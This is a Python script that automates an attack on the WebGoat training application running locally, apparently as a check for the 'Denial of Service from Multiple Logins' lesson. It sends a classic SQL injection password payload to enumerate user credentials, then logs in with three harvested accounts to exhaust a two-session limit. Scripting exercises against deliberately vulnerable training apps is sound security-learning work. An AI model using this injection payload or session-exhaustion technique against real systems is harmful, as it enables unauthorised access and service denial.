import requests
import json
import pprint
from bs4 import BeautifulSoup

s = requests.Session()

# Navigating to the WebGoat page
s.get("http://127.0.0.1:8080/WebGoat/login.mvc")

# Logging in
payload = {
	'username': 'guest',
	'password': 'guest'
}
s.post("http://127.0.0.1:8080/WebGoat/j_spring_security_check", payload)

# Navigating to the lesson menu and finding the screen number for vuln-24 
r = s.get("http://127.0.0.1:8080/WebGoat/service/lessonmenu.mvc")
output = r.json()
for elem in output:
	if elem['name'] == "Denial of Service":
		for child in elem['children']:
			if child['name'] == "Denial of Service from Multiple Logins":
				screen = child['link']

# Navigating to the vuln-24 lesson page
r = s.get("http://127.0.0.1:8080/WebGoat/" + screen)

# --[Begin attack on vuln-24]--

# SQL injection to enumerate user/password table
payload = {
	'Username': 'abc',
	'Password': '\' or \'1\' = \'1',
	'SUBMIT': 'Login'
}
r = s.post("http://127.0.0.1:8080/WebGoat/" + screen, payload)

# Login to web app using first user
payload = {
	'Username': 'jsnow',
	'Password': 'passwd1',
	'SUBMIT': 'Login'
}
r = s.post("http://127.0.0.1:8080/WebGoat/" + screen, payload)

# Login to web app using second user
payload = {
	'Username': 'jdoe',
	'Password': 'passwd2',
	'SUBMIT': 'Login'
}
r = s.post("http://127.0.0.1:8080/WebGoat/" + screen, payload)

# Login to web app using third user 
# The web app only allows two connections, this login should trigger the denial of service
payload = {
	'Username': 'jplane',
	'Password': 'passwd3',
	'SUBMIT': 'Login'
}
r = s.post("http://127.0.0.1:8080/WebGoat/" + screen, payload)

# --[End attack on vuln-24]--

# Parse the HTML response and verify the attack was successful
# If the response contains 'Congratulations' we have exploited the vulnerability and caused a denial of service
# If the response does not contain 'Congratulations' the vulnerability is not present
soup = BeautifulSoup(r.text, 'html.parser')
exploit_success = 'Congratulations.' in soup.find(id="message").string

if exploit_success:
	print("Attack Successful. vuln-24 is present")
else:
	print("Attack Failed. vuln-24 is not present")